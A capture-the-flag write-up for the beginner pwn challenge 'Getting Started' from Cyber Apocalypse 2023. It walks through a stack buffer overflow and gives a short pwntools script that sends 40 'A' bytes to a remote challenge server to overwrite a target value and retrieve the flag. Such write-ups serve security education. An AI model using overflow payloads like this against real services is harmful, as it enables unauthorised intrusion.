---
layout: load_md
title: The White Circle | Cyber Apocalypse 2023 | Getting Started Writeup
desc: Check out our writeup for Getting Started for Cyber Apocalypse 2023 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2023
parent: cyber_apocalypse_2023
category: pwn
challenge: Getting Started
tags: "pwn, legend, python"
date: 2023-03-27T00:00:00+00:00
last_modified_at: 2023-03-27T00:00:00+00:00
---


> Solved by Legend

Challenge description


> Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

In this challenge a challenge binary is given and a  `wrapper.py` file is given the code for buffer overflow.

![](https://i.imgur.com/6RwoC4j.png)


Executing the binary shows the Stack frame layout.

![](https://i.imgur.com/wgdbdWW.png)


After that it shows the stack with Address and Value along with indicators to where is the start of the buffer and what is the Target that needs to be changed.

![](https://i.imgur.com/XMsmiMc.png)


Then it shows what happens if we put A’s and B’s as input.

![](https://i.imgur.com/WGVoYSc.png)


Then it asks us to enter A’s to get change the value in Target. I placed 40 A’s and it grave the testing flag.

![](https://i.imgur.com/uUVYySG.png)


Now same can we done in the given script to automate this.


    #wrapper.py#!/usr/bin/python3.8
    
    '''
    You need to install pwntools to run the script.
    To run the script: python3 ./wrapper.py
    '''
    
    # Library
    from pwn import *
    
    # Open connection
    IP   = '165.232.98.69' # Change this
    PORT = 32238      # Change this
    
    r    = remote(IP, PORT)
    
    # Craft payload
    payload = b'A' * 40 # Change the number of "A"s
    
    # Send payload
    r.sendline(payload)
    
    # Read flag
    success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')

Running the script gave the flag.

![](https://i.imgur.com/krCUZGU.png)


